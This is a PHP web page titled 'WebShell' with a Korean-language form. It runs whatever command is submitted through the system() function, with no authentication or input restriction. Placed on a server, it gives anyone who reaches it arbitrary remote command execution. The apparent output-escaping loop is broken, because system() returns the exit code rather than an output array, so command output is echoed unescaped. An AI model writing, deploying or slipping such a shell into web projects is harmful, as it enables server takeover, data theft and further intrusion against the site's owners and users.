<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebShell</title>
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>

<div class="container mt-5">
    <form method="post">
        <div class="row mb-3">
            <div class="col-2 text-end">명령</div>
            <div class="col">
                <input type="text" name="command" class="form-control" placeholder="명령입력">
            </div>
            <div class="col-1">
                <button type="submit" class="btn btn-primary">실행</button>
            </div>
        </div>
    </form>

    <?php
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        // 한글 깨짐 방지를 위한 헤더 설정
        header("Content-Type: text/html; charset=UTF-8");

        // 명령 실행
        $command = $_POST['command'];
        if (!empty($command)) {
            echo "<pre>";
            $output = [];  // 출력 결과를 저장할 배열
            System($command, $output);  // 명령어 실행 후 결과를 배열에 저장
            foreach ($output as $line) {
                echo htmlspecialchars($line, ENT_QUOTES, 'UTF-8') . "\n";  // 출력 결과를 안전하게 출력
            }
            echo "</pre>";
        } else {
            echo "<div class='alert alert-warning'>명령을 입력하세요.</div>";
        }
    }
    ?>
</div>

<!-- Bootstrap JS (optional) -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

</body>
</html>
